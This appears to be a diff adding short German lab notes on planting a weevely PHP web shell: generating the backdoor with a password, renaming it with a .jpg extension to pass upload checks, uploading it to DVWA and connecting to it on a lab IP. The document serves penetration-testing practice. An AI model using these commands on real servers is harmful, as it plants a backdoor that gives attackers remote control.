@@ -1,0 +1,16 @@
+#======================#
+#   Backdoor weevely   #
+#======================#
+
+weevely generate 1111 /root/wrat.php
+
+1111 = password
+/root/wrat.php = pfad zur Datei
+
+cp wrat.php wrat.php.jpg
+
+File Uploaden im DVWA
+
+per weevely verbinden
+weevely http://10.10.10.103/dvwa/hackable/uploads/wrat.php.jpg 1111
+
